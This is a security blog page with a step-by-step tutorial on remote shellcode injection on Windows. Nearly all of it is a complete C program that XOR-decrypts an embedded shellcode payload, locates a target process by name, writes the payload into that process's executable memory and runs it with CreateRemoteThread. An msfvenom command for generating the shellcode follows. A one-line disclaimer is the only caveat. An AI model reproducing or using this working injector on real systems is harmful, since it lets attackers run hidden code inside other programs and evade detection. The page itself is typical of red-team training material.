<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Remote Shellcode Injection - pwn3rx0</title>
  <meta name="description" content="A step-by-step guide and code implementation for injecting encrypted shellcode into a remote process using OpenProcess, VirtualAllocEx, and CreateRemoteThread.">
  <meta name="keywords" content="malware-development, shellcode-injection, win-api, process-manipulation, evasion, cybersecurity, security, writeups, ctf, pentest, penetration testing, red team, red teaming, malware, malware development, windows internals, windows api, shellcode, payload, injection, active directory, ad, ad enumeration, kerberoasting, lateral movement, post exploitation, defense evasion, opsec, privilege escalation, blue team, incident response, andrew mamdouh, pwn3rx0, andrew_mamdouh, malware dev, execution">
  <meta name="author" content="Andrew Mamdouh (pwn3rx0)">
  <link rel="canonical" href="/writeups/Malware DEV/Execution/Remote ShellCode Injection/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta property="og:title" content="Remote Shellcode Injection">
  <meta property="og:description" content="A step-by-step guide and code implementation for injecting encrypted shellcode into a remote process using OpenProcess, VirtualAllocEx, and CreateRemoteThread.">
  <meta property="og:type" content="article">
  <meta property="og:site_name" content="pwn3rx0 blog">
  <meta property="og:image" content="/assets/images/og-home.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="/writeups/Malware DEV/Execution/Remote ShellCode Injection/">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Remote Shellcode Injection">
  <meta name="twitter:description" content="A step-by-step guide and code implementation for injecting encrypted shellcode into a remote process using OpenProcess, VirtualAllocEx, and CreateRemoteThread.">
  <meta name="twitter:image" content="/assets/images/og-home.png">
  <meta name="site-base" content="/">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/github-dark.min.css">
  <link rel="icon" href="/assets/icons/favicon.svg" type="image/svg+xml">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon" sizes="any">
</head>
<body>
  <div class="app-container">
    <aside class="sidebar">
      <div class="profile-card">
        <div class="avatar">
          <img src="/assets/images/profile.jpg" alt="Andrew Mamdouh">
        </div>
        <div class="profile-name">Andrew Mamdouh</div>
        <div class="profile-nick" style="color:#8a8f98;">(pwn3rx0)</div>
        <nav class="social-tabs">
          <a class="chip" href="https://github.com/pwn3rx0">GitHub</a>
          <a class="chip" href="https://www.linkedin.com/in/andrew-mamdouh122">LinkedIn</a>
          <a class="chip" href="https://x.com/pwn3rx0">X</a>
        </nav>
      </div>
      <nav class="category-tree"></nav>
    </aside>
    <main class="main-content">
      <nav class="breadcrumbs">
      
      <a href="/">Home</a>
    
      <span class="separator">/</span>
      <a href="/category/Malware DEV/">Malware DEV</a>
    
      <span class="separator">/</span>
      <a href="/category/Malware DEV/Execution/">Execution</a>
    
      <span class="separator">/</span>
      <span class="current">Remote Shellcode Injection</span>
    </nav>
      <article class="writeup">
        <header>
          <h1>Remote Shellcode Injection</h1>
          <div class="writeup-meta">
            <div class="writeup-date">date: <time datetime="February 24, 2026 at 02:00 AM">February 24, 2026 at 02:00 AM</time></div>
            <div class="tags-row">
              <div class="tags-label">tags:</div>
              <div class="tags"><span class="tag">malware-development</span><span class="tag">shellcode-injection</span><span class="tag">win-api</span><span class="tag">process-manipulation</span><span class="tag">evasion</span></div>
            </div>
            
          </div>
        </header>
        <div class="writeup-content"><p>This program demonstrates <strong>injecting shellcode into another running process</strong> on Windows. It includes an encrypted shellcode payload that is decrypted using XOR, then written into a target process’s memory and executed via a remote thread.</p>
<blockquote>
<p>⚠️ <strong>For educational and authorized testing purposes only. Do not use without permission.</strong></p>
</blockquote>
<hr>
<h2>What It Does</h2>
<ol>
<li><strong>Decrypts shellcode</strong> using a custom XOR key.</li>
<li><strong>Finds a target process</strong> by its name (e.g., <code>notepad.exe</code>).</li>
<li><strong>Opens the process and writes memory.</strong></li>
<li><strong>Creates a remote thread</strong> to run the shellcode in that process.</li>
</ol>
<hr>
<pre><code class="language-c">#include &lt;Windows.h&gt;
#include &lt;TlHelp32.h&gt;
#include &lt;stdio.h&gt;

void WaitForEnter(const char* stepDescription) {
    printf(&quot;\n[*] %s\nPress ENTER to continue...\n&quot;, stepDescription);
    getchar();
}

BOOL XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (SIZE_T i = 0, j = 0; i &lt; sShellcodeSize; i++, j++) {
        if (j &gt;= sKeySize) j = 0;
        pShellcode[i] ^= bKey[j];
    }
    return TRUE;
}

DWORD FindProcessId(const wchar_t* processName) {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(snapshot, &amp;entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &amp;entry));
    }
    CloseHandle(snapshot);
    return 0;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 2) {
        wprintf(L&quot;Usage: %s &lt;ProcessName.exe&gt;\n&quot;, argv[0]);
        return 1;
    }

    const wchar_t* targetProcessName = argv[1];
    wprintf(L&quot;[+] Target process name: %s\n&quot;, targetProcessName);

    // Shellcode (encrypted)
    unsigned char cipherText[] = {
        0x8A, 0xFF, 0xEA, 0x00, 0x1F, 0x2E, 0xC5, 0xEE, 0x75, 0x8B, 0xB8, 0xC2, 0x07, 0x47, 0xCA, 0x76,
        0x20, 0xFF, 0x58, 0x36, 0x8A, 0x8E, 0x8E, 0xBC, 0x15, 0xC3, 0x72, 0xC1, 0x5E, 0x5F, 0x13, 0x75,
        0x56, 0xFF, 0xE2, 0x96, 0xBF, 0x8E, 0x0A, 0x59, 0x3F, 0xC1, 0xB4, 0xA2, 0x8F, 0x5F, 0xA9, 0xE7,
        0xDA, 0x8B, 0x08, 0x98, 0xED, 0xEA, 0x25, 0xAF, 0xB4, 0x42, 0xF4, 0xD2, 0x47, 0xD6, 0x7A, 0xCA,
        0x24, 0xF6, 0x38, 0xAC, 0x64, 0x94, 0x25, 0x65, 0x37, 0xB7, 0xB1, 0x92, 0x96, 0x9C, 0x18, 0xAF,
        0x76, 0xB7, 0x69, 0xAC, 0x6A, 0x06, 0x71, 0x89, 0x3D, 0x8A, 0x29, 0xC3, 0xCD, 0x5F, 0x80, 0x63,
        0xFD, 0xF7, 0x49, 0xAD, 0xEE, 0x16, 0xE6, 0xB8, 0x3D, 0x74, 0x30, 0xD2, 0xCD, 0x23, 0x10, 0x6F,
        0x77, 0x61, 0x24, 0xD5, 0x26, 0x8E, 0x34, 0x2E, 0xD9, 0xCA, 0x38, 0x5A, 0x4B, 0x56, 0x99, 0xE6,
        0x4E, 0x57, 0x1C, 0x15, 0xA3, 0xC5, 0x49, 0xCA, 0x7D, 0xCE, 0xC0, 0x42, 0x33, 0xCF, 0xC0, 0x63,
        0xFD, 0xF7, 0x4D, 0xAD, 0xEE, 0x16, 0x63, 0xAF, 0xFE, 0x87, 0xB1, 0xD7, 0xCD, 0x57, 0x84, 0x6E,
        0x77, 0x67, 0x28, 0x6F, 0xEB, 0x4E, 0x4D, 0xEF, 0xA5, 0xCA, 0xA1, 0xD2, 0x1E, 0x49, 0xC1, 0x7D,
        0x37, 0xEF, 0x28, 0xBD, 0xAE, 0x9C, 0x4D, 0x6D, 0x99, 0xAB, 0xB8, 0xC1, 0xB9, 0xF7, 0xC0, 0x66,
        0x2F, 0xED, 0x21, 0x6F, 0xFD, 0x2F, 0x52, 0x11, 0x8A, 0x74, 0xA4, 0xDB, 0xFC, 0x16, 0x98, 0x27,
        0x76, 0xB7, 0x69, 0xE4, 0xEF, 0x8E, 0x88, 0x63, 0x74, 0x8A, 0xF9, 0x93, 0x07, 0xAD, 0xA9, 0xAC,
        0x19, 0x30, 0x96, 0x31, 0x54, 0x26, 0x18, 0xC4, 0x7F, 0xCA, 0x43, 0x35, 0xD3, 0xAA, 0x05, 0xD8,
        0xA3, 0xFF, 0xEA, 0x20, 0xC7, 0xFA, 0x03, 0x92, 0x7F, 0x0B, 0x02, 0x73, 0x33, 0x12, 0x23, 0x60,
        0x65, 0xC5, 0x06, 0x8E, 0xEF, 0x9F, 0x44, 0x67, 0xAF, 0x74, 0x2C, 0xF0, 0x27, 0x7B, 0xFB, 0x09,
        0x13, 0xCF, 0x0C, 0xE4 };
    SIZE_T shellcodeSize = sizeof(cipherText);

    // XOR decryption key
    unsigned char XorKey[] = {
        0x76, 0xB7, 0x69, 0xE4, 0xEF, 0xC6, 0x05, 0xEE, 0x75, 0x8B, 0xF9, 0x93, 0x46, 0x17, 0x98, 0x27
    };

    WaitForEnter(&quot;Step 1: Decrypting shellcode using XOR key...&quot;);
    if (!XorByInputKey(cipherText, shellcodeSize, XorKey, sizeof(XorKey))) {
        wprintf(L&quot;[!] Decryption failed.\n&quot;);
        return 1;
    }
    printf(&quot;[+] Shellcode decrypted successfully.\n&quot;);

    DWORD pid = FindProcessId(targetProcessName);
    if (!pid) {
        wprintf(L&quot;[!] Could not find process: %s\n&quot;, targetProcessName);
        return 1;
    }
    printf(&quot;[+] Target PID: %lu\n&quot;, pid);

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) {
        wprintf(L&quot;[!] OpenProcess failed: %lu\n&quot;, GetLastError());
        return 1;
    }
    printf(&quot;[+] Handle to target process obtained.\n&quot;);

    WaitForEnter(&quot;Step 2: Allocating memory in the remote process...&quot;);
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        wprintf(L&quot;[!] VirtualAllocEx failed: %lu\n&quot;, GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf(&quot;[+] Memory allocated at remote address: 0x%p\n&quot;, remoteMem);

    WaitForEnter(&quot;Step 3: Ready to inject shellcode into the above memory location...&quot;);

    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMem, cipherText, shellcodeSize, &amp;written) || written != shellcodeSize) {
        wprintf(L&quot;[!] WriteProcessMemory failed: %lu\n&quot;, GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf(&quot;[+] Shellcode successfully written to remote process memory.\n&quot;);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        wprintf(L&quot;[!] CreateRemoteThread failed: %lu\n&quot;, GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf(&quot;[+] Remote thread created. Shellcode is now executing in %s (PID: %lu)\n&quot;, targetProcessName, pid);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
</code></pre>
<p>make sure u use <code>EXITFUNC=thread</code>:</p>
<pre><code class="language-bash">msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o calc.bin
</code></pre>
</div>
        <nav class="post-navigation">
          <span class="nav-link disabled"><span class="nav-direction">← Previous</span><span class="nav-title">No older post</span></span>
          
      <a href="/writeups/Malware DEV/Execution/APC Injection/" class="nav-link next-post">
        <span class="nav-direction">Next →</span>
        <span class="nav-title">APC Injection</span>
      </a>
    
        </nav>
        
      <aside class="related-posts">
        <h3>Related Writeups</h3>
        <ul class="related-list">
          <li><a href="/writeups/Malware DEV/Encryption/RC4 Native API/">RC4 Stream Cipher (Native API)</a></li><li><a href="/writeups/Malware DEV/Obfuscation/To IPs/">IPv4 Masquerading (Obfuscation)</a></li><li><a href="/writeups/Malware DEV/Payload Placement/Staged/HTTP Stageing/">HTTP Stager & Remote Payload Delivery</a></li>
        </ul>
      </aside>
    
      </article>
    </main>
  </div>
  <button class="mobile-menu-toggle">☰</button>
  <script src="/assets/js/main.js"></script>
  <script src="/assets/js/navigation.js"></script>
  <script>
    window.MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']],
        displayMath: [['$$','$$'], ['\\[','\\]']]
      },
      svg: { fontCache: 'global' }
    };
  </script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js" defer></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/c.min.js" defer></script>
  <script>(function(){function _0x5edc91(_0x2a3f15){const _0x1af095=_0x2a3f15||document['querySelector']('.writeup-content')||document,_0x5ce41d=Array['from'](_0x1af095['querySelectorAll']('pre\x20>\x20code'))['filter'](_0x2e4a95=>!_0x2e4a95['closest']('.code-block'));_0x5ce41d['forEach'](_0x4c0ab4=>{const _0x2659b3=_0x4c0ab4['parentElement'];if(!_0x2659b3||_0x2659b3['dataset']['enhanced']==='true')return;_0x2659b3['dataset']['enhanced']='true';let _0x20e711=Array['from'](_0x4c0ab4['classList']||[])['find'](_0xd93b62=>_0xd93b62['startsWith']('language-'));if(!_0x20e711){const _0xbfd173=_0x4c0ab4['textContent']||'';(/#include\s+<[^>]+>/['test'](_0xbfd173)||/\bint\s+main\s*\(/['test'](_0xbfd173)||/#include\s+<Windows\.h>/i['test'](_0xbfd173))&&(_0x4c0ab4['classList']['add']('language-c'),_0x20e711='language-c');}const _0x15ec58=(_0x20e711?_0x20e711['replace']('language-',''):'text')['toUpperCase'](),_0x3aa886=document['createElement']('div');_0x3aa886['className']='code-block';const _0x2587d8=document['createElement']('div');_0x2587d8['className']='code-header';const _0x37e96e=document['createElement']('span');_0x37e96e['className']='code-lang',_0x37e96e['textContent']=_0x15ec58;const _0x2f2f46=document['createElement']('button');_0x2f2f46['className']='code-copy',_0x2f2f46['type']='button',_0x2f2f46['textContent']='Copy',_0x2f2f46['addEventListener']('click',async()=>{const _0x5e1529=_0x4c0ab4['innerText'],_0x26900e=()=>{const _0x12222f=document['createElement']('textarea');_0x12222f['value']=_0x5e1529,_0x12222f['style']['position']='fixed',_0x12222f['style']['opacity']='0',_0x12222f['style']['left']='-9999px',document['body']['appendChild'](_0x12222f),_0x12222f['focus'](),_0x12222f['select']();try{document['execCommand']('copy'),_0x2f2f46['textContent']='Copied';}catch(_0xbd3b21){_0x2f2f46['textContent']='Failed';}finally{document['body']['removeChild'](_0x12222f),setTimeout(()=>_0x2f2f46['textContent']='Copy',0x4b0);}};try{navigator['clipboard']&&window['isSecureContext']?(await navigator['clipboard']['writeText'](_0x5e1529),_0x2f2f46['textContent']='Copied',setTimeout(()=>_0x2f2f46['textContent']='Copy',0x4b0)):_0x26900e();}catch(_0x564adf){_0x26900e();}}),_0x2587d8['appendChild'](_0x37e96e),_0x2587d8['appendChild'](_0x2f2f46);const _0x2f084c=document['createElement']('div');_0x2f084c['className']='code-content',_0x2659b3['replaceWith'](_0x3aa886),_0x2f084c['appendChild'](_0x2659b3),_0x3aa886['appendChild'](_0x2587d8),_0x3aa886['appendChild'](_0x2f084c);if(window['hljs']&&typeof window['hljs']['highlightElement']==='function')window['hljs']['highlightElement'](_0x4c0ab4);else window['hljs']&&typeof window['hljs']['highlightAll']==='function'&&window['hljs']['highlightAll']();});}function _0x3f764a(_0x313efc){const _0x17f703=_0x313efc||document['querySelector']('.writeup-content');if(!_0x17f703)return;const _0x22c82f=_0x17f703['querySelectorAll']('h1,h2,h3,h4,h5,h6');_0x22c82f['forEach'](_0x581d05=>{const _0x70e87=parseInt(_0x581d05['tagName']['substring'](0x1),0xa);let _0x2b4662=_0x581d05['nextElementSibling'];while(_0x2b4662){if(/^H[1-6]$/['test'](_0x2b4662['tagName'])){const _0x12b417=parseInt(_0x2b4662['tagName']['substring'](0x1),0xa);if(_0x12b417<=_0x70e87)break;}_0x2b4662['tagName']==='P'&&_0x2b4662['classList']['add']('indent-p'),_0x2b4662=_0x2b4662['nextElementSibling'];}});}function _0x37c193(){window['mermaid']&&mermaid['initialize']({'startOnLoad':!![],'theme':'dark'});_0x5edc91(),_0x3f764a();window['hljs']&&typeof window['hljs']['highlightAll']==='function'&&window['hljs']['highlightAll']();const _0x5ca6df=document['querySelector']('.writeup-content');if(_0x5ca6df&&window['MutationObserver']){const _0x4ec600=new MutationObserver(()=>{_0x5edc91(_0x5ca6df),_0x3f764a(_0x5ca6df),window['hljs']&&typeof window['hljs']['highlightAll']==='function'&&window['hljs']['highlightAll']();});_0x4ec600['observe'](_0x5ca6df,{'childList':!![],'subtree':!![]});}}window['addEventListener']('load',_0x37c193);}());</script>
</body>
</html>
